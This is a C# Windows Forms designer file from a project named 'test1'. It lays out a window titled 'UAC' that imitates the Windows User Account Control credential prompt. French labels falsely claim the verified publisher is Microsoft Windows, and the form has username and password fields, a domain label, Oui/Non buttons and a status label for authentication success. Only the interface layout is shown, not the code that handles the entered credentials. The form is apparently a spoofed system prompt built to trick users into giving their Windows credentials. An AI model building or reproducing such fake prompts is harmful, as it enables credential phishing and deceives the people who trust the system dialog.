namespace test1
{
    partial class UAC
    {
        /// <summary>
        /// Variable nécessaire au concepteur.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Nettoyage des ressources utilisées.
        /// </summary>
        /// <param name="disposing">true si les ressources managées doivent être supprimées ; sinon, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Code généré par le Concepteur Windows Form

        /// <summary>
        /// Méthode requise pour la prise en charge du concepteur - ne modifiez pas
        /// le contenu de cette méthode avec l'éditeur de code.
        /// </summary>
        private void InitializeComponent()
        {
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(UAC));
            this.username = new System.Windows.Forms.TextBox();
            this.password = new System.Windows.Forms.TextBox();
            this.bntYes = new System.Windows.Forms.Button();
            this.bntNo = new System.Windows.Forms.Button();
            this.lblDomain = new System.Windows.Forms.Label();
            this.lblContinue = new System.Windows.Forms.Label();
            this.lblFileOrigin = new System.Windows.Forms.Label();
            this.lblEditeurVerifier = new System.Windows.Forms.Label();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.lblProgramName = new System.Windows.Forms.Label();
            this.lblAuthSucess = new System.Windows.Forms.Label();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // username
            // 
            this.username.AccessibleName = "";
            this.username.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.username.ForeColor = System.Drawing.Color.Gray;
            this.username.Location = new System.Drawing.Point(31, 156);
            this.username.Multiline = true;
            this.username.Name = "username";
            this.username.Size = new System.Drawing.Size(325, 30);
            this.username.TabIndex = 0;
            this.username.TextChanged += new System.EventHandler(this.username_TextChanged);
            this.username.KeyDown += new System.Windows.Forms.KeyEventHandler(this.username_KeyDown);
            // 
            // password
            // 
            this.password.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.password.ForeColor = System.Drawing.Color.Gray;
            this.password.Location = new System.Drawing.Point(31, 205);
            this.password.Multiline = true;
            this.password.Name = "password";
            this.password.Size = new System.Drawing.Size(325, 30);
            this.password.TabIndex = 1;
            this.password.TextChanged += new System.EventHandler(this.textBox2_TextChanged);
            this.password.KeyDown += new System.Windows.Forms.KeyEventHandler(this.password_KeyDown);
            // 
            // bntYes
            // 
            this.bntYes.Location = new System.Drawing.Point(31, 287);
            this.bntYes.Name = "bntYes";
            this.bntYes.Size = new System.Drawing.Size(155, 46);
            this.bntYes.TabIndex = 2;
            this.bntYes.Text = "Oui";
            this.bntYes.UseVisualStyleBackColor = true;
            this.bntYes.Click += new System.EventHandler(this.button1_Click);
            // 
            // bntNo
            // 
            this.bntNo.Location = new System.Drawing.Point(200, 287);
            this.bntNo.Name = "bntNo";
            this.bntNo.Size = new System.Drawing.Size(156, 46);
            this.bntNo.TabIndex = 3;
            this.bntNo.Text = "Non";
            this.bntNo.UseVisualStyleBackColor = true;
            this.bntNo.Click += new System.EventHandler(this.button2_Click);
            // 
            // lblDomain
            // 
            this.lblDomain.AutoSize = true;
            this.lblDomain.Font = new System.Drawing.Font("Microsoft Sans Serif", 12F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.lblDomain.Location = new System.Drawing.Point(31, 252);
            this.lblDomain.Name = "lblDomain";
            this.lblDomain.Size = new System.Drawing.Size(72, 20);
            this.lblDomain.TabIndex = 4;
            this.lblDomain.Text = "Domain: ";
            // 
            // lblContinue
            // 
            this.lblContinue.AutoSize = true;
            this.lblContinue.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.lblContinue.Location = new System.Drawing.Point(28, 127);
            this.lblContinue.Name = "lblContinue";
            this.lblContinue.Size = new System.Drawing.Size(348, 15);
            this.lblContinue.TabIndex = 5;
            this.lblContinue.Text = "Pour continuer, entrez un nom d\'utilisateur et un mot de passe.\r\n";
            this.lblContinue.Click += new System.EventHandler(this.lblContinue_Click);
            // 
            // lblFileOrigin
            // 
            this.lblFileOrigin.AutoSize = true;
            this.lblFileOrigin.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.lblFileOrigin.Location = new System.Drawing.Point(28, 101);
            this.lblFileOrigin.Name = "lblFileOrigin";
            this.lblFileOrigin.Size = new System.Drawing.Size(277, 15);
            this.lblFileOrigin.TabIndex = 6;
            this.lblFileOrigin.Text = "Origine du fichier: Disque dur sur cette ordinateur ";
            // 
            // lblEditeurVerifier
            // 
            this.lblEditeurVerifier.AutoSize = true;
            this.lblEditeurVerifier.Font = new System.Drawing.Font("Microsoft Sans Serif", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.lblEditeurVerifier.Location = new System.Drawing.Point(28, 86);
            this.lblEditeurVerifier.Name = "lblEditeurVerifier";
            this.lblEditeurVerifier.Size = new System.Drawing.Size(190, 15);
            this.lblEditeurVerifier.TabIndex = 7;
            this.lblEditeurVerifier.Text = "Éditeur vérifié: Microsoft Windows";
            this.lblEditeurVerifier.Click += new System.EventHandler(this.lblEditeurVerifier_Click);
            // 
            // pictureBox1
            // 
            this.pictureBox1.ErrorImage = null;
            this.pictureBox1.Image = ((System.Drawing.Image)(resources.GetObject("pictureBox1.Image")));
            this.pictureBox1.InitialImage = null;
            this.pictureBox1.Location = new System.Drawing.Point(31, 12);
            this.pictureBox1.Name = "pictureBox1";
            this.pictureBox1.Size = new System.Drawing.Size(72, 71);
            this.pictureBox1.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage;
            this.pictureBox1.TabIndex = 8;
            this.pictureBox1.TabStop = false;
            // 
            // lblProgramName
            // 
            this.lblProgramName.AutoSize = true;
            this.lblProgramName.Font = new System.Drawing.Font("Microsoft Sans Serif", 20F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.lblProgramName.Location = new System.Drawing.Point(109, 42);
            this.lblProgramName.Name = "lblProgramName";
            this.lblProgramName.Size = new System.Drawing.Size(0, 31);
            this.lblProgramName.TabIndex = 9;
            this.lblProgramName.Click += new System.EventHandler(this.label1_Click);
            // 
            // lblAuthSucess
            // 
            this.lblAuthSucess.AutoSize = true;
            this.lblAuthSucess.ForeColor = System.Drawing.Color.Red;
            this.lblAuthSucess.Location = new System.Drawing.Point(35, 340);
            this.lblAuthSucess.Name = "lblAuthSucess";
            this.lblAuthSucess.Size = new System.Drawing.Size(0, 13);
            this.lblAuthSucess.TabIndex = 10;
            // 
            // UAC
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.BackColor = System.Drawing.SystemColors.ControlLight;
            this.ClientSize = new System.Drawing.Size(394, 356);
            this.ControlBox = false;
            this.Controls.Add(this.lblAuthSucess);
            this.Controls.Add(this.lblProgramName);
            this.Controls.Add(this.pictureBox1);
            this.Controls.Add(this.lblEditeurVerifier);
            this.Controls.Add(this.lblFileOrigin);
            this.Controls.Add(this.lblContinue);
            this.Controls.Add(this.lblDomain);
            this.Controls.Add(this.bntNo);
            this.Controls.Add(this.bntYes);
            this.Controls.Add(this.password);
            this.Controls.Add(this.username);
            this.MaximizeBox = false;
            this.MinimizeBox = false;
            this.Name = "UAC";
            this.ShowIcon = false;
            this.ShowInTaskbar = false;
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "UAC";
            this.Load += new System.EventHandler(this.Form1_Load);
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).EndInit();
            this.ResumeLayout(false);
            this.PerformLayout();

        }

        #endregion

        private System.Windows.Forms.TextBox username;
        private System.Windows.Forms.TextBox password;
        private System.Windows.Forms.Button bntYes;
        private System.Windows.Forms.Button bntNo;
        private System.Windows.Forms.Label lblDomain;
        private System.Windows.Forms.Label lblContinue;
        private System.Windows.Forms.Label lblFileOrigin;
        private System.Windows.Forms.Label lblEditeurVerifier;
        private System.Windows.Forms.PictureBox pictureBox1;
        private System.Windows.Forms.Label lblProgramName;
        private System.Windows.Forms.Label lblAuthSucess;
    }
}

